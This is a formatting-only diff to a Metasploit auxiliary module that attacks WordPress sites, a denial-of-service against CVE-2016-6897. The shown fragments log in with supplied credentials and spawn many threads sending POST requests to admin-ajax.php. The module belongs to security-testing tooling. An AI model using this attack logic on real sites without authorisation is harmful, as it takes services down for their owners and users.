@@ -8,28 +8,29 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'WordPress Traversal Directory DoS',
-      'Description'     =>  %q{
-        Cross-site request forgery (CSRF) vulnerability in the wp_ajax_update_plugin
-        function in wp-admin/includes/ajax-actions.php in WordPress before 4.6
-        allows remote attackers to hijack the authentication of subscribers
-        for /dev/random read operations by leveraging a late call to
-        the check_ajax_referer function, a related issue to CVE-2016-6896.},
-      'License'         => MSF_LICENSE,
-      'Author'          =>
-        [
-          'Yorick Koster',           # Vulnerability disclosure
-          'CryptisStudents'          # Metasploit module
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Traversal Directory DoS',
+        'Description' => %q{
+          Cross-site request forgery (CSRF) vulnerability in the wp_ajax_update_plugin
+          function in wp-admin/includes/ajax-actions.php in WordPress before 4.6
+          allows remote attackers to hijack the authentication of subscribers
+          for /dev/random read operations by leveraging a late call to
+          the check_ajax_referer function, a related issue to CVE-2016-6896.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Yorick Koster', # Vulnerability disclosure
+          'CryptisStudents' # Metasploit module
         ],
-      'References'      =>
-        [
+        'References' => [
           ['CVE', '2016-6897'],
           ['EDB', '40288'],
           ['OVEID', 'OVE-20160712-0036']
         ],
-    ))
+      )
+    )
 
     register_options(
       [
@@ -39,7 +40,8 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('DEPTH', [true, 'The depth of the path', 10]),
         OptString.new('USERNAME', [true, 'The username to send the requests with', '']),
         OptString.new('PASSWORD', [true, 'The password to send the requests with', ''])
-        ])
+      ]
+    )
   end
 
   def rlimit
@@ -87,7 +89,7 @@ class MetasploitModule < Msf::Auxiliary
 
       starting_thread = 1
 
-      cookie  = wordpress_login(username, password)
+      cookie = wordpress_login(username, password)
       store_valid_credential(user: username, private: password, proof: cookie)
       if cookie.nil?
         print_error('Aborting operation - failed to authenticate')
@@ -105,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
           threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
             begin
               # shell code
-              res = send_request_cgi( opts = {
+              res = send_request_cgi(opts = {
                 'method' => 'POST',
                 'uri' => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),
                 'vars_post' => {
